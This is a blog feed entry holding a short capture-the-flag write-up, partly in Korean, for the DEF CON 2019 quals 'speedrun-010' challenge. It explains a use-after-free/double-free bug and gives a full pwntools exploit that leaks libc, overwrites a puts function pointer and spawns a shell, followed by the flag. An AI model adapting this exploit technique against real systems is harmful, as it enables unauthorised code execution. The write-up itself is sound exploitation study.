    <entry>
      <title>Defcon 2019 speedrun 010</title>
      <link href="/2019/07/21/DEFCON%202019%20speedrun010/"/>
      <url>/2019/07/21/DEFCON%202019%20speedrun010/</url>
      
        <content type="html"><![CDATA[<p>2019 defcon</p><a id="more"></a><h2 id="VULN"><a href="#VULN" class="headerlink" title="VULN"></a>VULN</h2><p>PUTS의 주소가 힙에 있는데 FREE할때 초기화를 안함.<br>DOUBLE FREE로 같은 곳에 입력받아 립씨 릭 &amp; MESSAGE INPUT으로 PUTS POINTER OVERWRITE 가능</p><h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a><a href="#EXPLOIT">EXPLOIT</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&apos;speedrun-010.quals2019.oooverflow.io&apos;, 31337)</span><br><span class="line">e = ELF(&quot;./10&quot;)</span><br><span class="line">l = e.libc</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">def n(p):</span><br><span class="line">        r.sendafter(&quot; 5\n&quot;,&quot;1&quot;)</span><br><span class="line">        r.sendafter(&quot;name\n&quot;, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def m(p):</span><br><span class="line">        r.sendafter(&quot; 5\n&quot;,&quot;2&quot;)</span><br><span class="line">        r.sendafter(&quot;message\n&quot;, p)</span><br><span class="line">def nf():</span><br><span class="line">        r.sendafter(&quot; 5\n&quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def mf():</span><br><span class="line">        r.sendafter(&quot; 5\n&quot;,&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n(&apos;zzzzzz22222&apos;)</span><br><span class="line">m(&apos;eeeeeeeeeeeee&apos;)</span><br><span class="line">mf()</span><br><span class="line">n(&apos;a&apos;)</span><br><span class="line">m(&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">libc = u64(r.recvuntil(&apos;\x7f&apos;)[-6:]+&apos;\x00\x00&apos;)</span><br><span class="line">libc = libc - l.symbols[&apos;puts&apos;]</span><br><span class="line">log.info(&quot;[LIBC] : &quot; + hex(libc))</span><br><span class="line">s = libc + 0x4f440</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n(&apos;/bin/sh\x00&apos;)</span><br><span class="line">nf()</span><br><span class="line">m(&quot;A&quot;*16 + p64(s))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG: OOO{Yeah, he’s loony. He just like his toons. Aren’t W#_____411???}</p></blockquote>]]></content>
      
      
